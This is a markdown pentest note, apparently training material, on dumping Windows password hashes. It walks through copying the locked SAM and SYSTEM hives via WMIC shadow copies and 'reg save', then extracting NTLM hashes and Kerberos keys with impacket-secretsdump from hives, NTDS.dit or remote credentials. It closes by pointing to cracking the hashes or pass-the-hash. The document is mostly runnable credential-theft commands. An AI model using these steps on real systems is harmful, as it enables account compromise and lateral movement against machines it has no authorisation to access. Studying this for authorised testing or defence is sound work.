# Dumping Windows Password Hashes.md

Using Impacket's SecretsDump, we can dump the Windows password hashes.

###  Obtain Credentials from SAM database
- The SAM is located at *C:\Windows\System32\config\SAM*
- The SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from administrative command prompt
```powershell
C:\>copy c:\Windows\System32\config\sam C:\Users\offsec.corp1\Downloads\sam
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

> ***It is possible to perform a physical attack as well by booting the computer off an external media like a USB into a Linux-based operating system and accessing the content of the hard drive.***

> There are 2 potential workarounds:

#### Method 01 - Volume Shadow Copy Server - Available only in Server Edition
- We can create a snapshot (or "shadow volume") of the local hard drive with vssadmin - installed on Windows 8.1 and later.
- We can create a new shadow volume with the `create shadow` option. 
- -> "***BUT*** ..", this option is only available on server edition of the tool.

#### Method 02 - WMIC with shadowcopy
> Note that the following commands must be run from a standard cmd.exe prompt, not from a PowerShell prompt.

1. We can execute this option through WMIC launched from an administrative command prompt.
```powershell
C:\> wmic shadowcopy call create Volume='C:\'
```
2. To verify this:
```powershell
C:\> vssadmin list shadows
```
3. Copy the SAM database from it using the source path
```powershell
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec\Downloads\sam
```
4. cop the SYSTEM file using the same method ^^ - Raison below
```powershell
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
```

**PS:**
- Although we have copied the SAM database, it is partially encrypted by either RC4 (Windows 10 prior to Anniversary edition also called 1607 or RS1) or AES. (Anniversary edition and newer). The encryption keys are stored in the _SYSTEM_ file, which is in the same folder as the SAM database. However, it is also locked by the _SYSTEM_ account. We can reuse our shadow volume copy to copy this file as well

#### Method 03  Using Register (Reg)
- We can use the `reg save` command to save the content to the hard disk by specifying the registry hive and the output file name and path
```powershell
C:\> reg save HKLM\sam C:\users\offsec\Downloads\sam
C:\> reg save HKLM\system C:\users\offsec\Downloads\system
```

## Decrypt SAM Database and SYSTEM file
### Using Credentials
```sh
impacket-secretsdump example.local/username:password@<target-ip>

# -just-dc: Extract only NTDS.DIT (NTLM hashes and kerberos keys).
impacket-secretsdump -just-dc example.local/username:password@<target-ip>
# -just-dc-ntlm: Extract only NTDS.DIT data (NTLM hashes only).
impacket-secretsdump -just-dc-ntlm example.local/username:password@<target-ip>
```

### Using NTDS file or Hives
```sh
# -ntds: NTDS.DIT file to parse
# -system: SYSTEM hive to parse
impacket-secretsdump -ntds ntds.dit -system system LOCAL

# -sam: SAM hive to parse
# -security: SECURITY hive to parse
# -system: SYSTEM hive to parse
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
```

After dumping, we can crack them to reveal passwords or use them with **Pass-The-Hash**.
